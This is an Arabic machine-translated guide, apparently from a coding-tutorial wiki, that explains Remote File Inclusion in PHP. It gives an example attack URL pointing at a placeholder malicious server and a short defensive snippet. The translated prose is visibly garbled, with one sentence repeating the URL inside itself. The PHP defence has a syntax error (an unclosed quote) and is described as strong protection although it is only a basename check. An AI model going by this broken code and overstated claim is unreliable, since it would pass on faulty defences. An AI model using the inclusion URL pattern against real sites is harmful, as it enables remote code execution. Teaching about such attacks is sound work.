---
title: Remote File Inclusion
localeTitle: إدراج الملف عن بعد
---
## إدراج الملف عن بعد

ثغرة أمنية في التطبيق تسببها مبرمج تتطلب إدخال ملف يقدمه المستخدم ولا يعقم المدخلات قبل الوصول إلى الملف المطلوب. وينتج عن ذلك سحب ملف من خادم بعيد وتضمين المكان الذي لا ينبغي أن يكون فيه.

### مثال على هجمات تضمين الملفات عن بعد

يسمح لك موقع الويب بمشاهدة ملفات PDF كملف `download.php?file=myfile.php` ، نظرًا لنقص التحقق الصحيح من مستخدم ضار قادر على طلب مورد بعيد وإدراجه في البرنامج النصي. يمكن أن يصبح عنوان URL `download.php?file=http://myevilserver.gtld/evilcode.php` يمكن أن يتم `download.php?file=http://myevilserver.gtld/evilcode.php` ذلك إلى المستخدم أو في الحالات الشديدة تشغيل شفرة PHP الفعلية على الخادم الخاص بك.

### الدفاع عن موقع الويب الخاص بك من هجمات تضمين الملفات عن بعد في PHP

سيوفر كود PHP التالي حماية قوية ضد هجمات تضمين الملفات عن بعد

 `<?php 
 if(basename($_GET['file]) !== $_GET['file']) { 
  die('INVALID FILE REQUESTED'); 
 } 
` 

*   يمكنك تعطيل `allow_url_fopen` في ملف php.ini كحماية إضافية ضد تضمين الملفات عن بعد.

#### معلومات اكثر:

*   [OWASP Wiki - اختبار لدمج ملف عن بعد](https://www.owasp.org/index.php/Testing_for_Remote_File_Inclusion)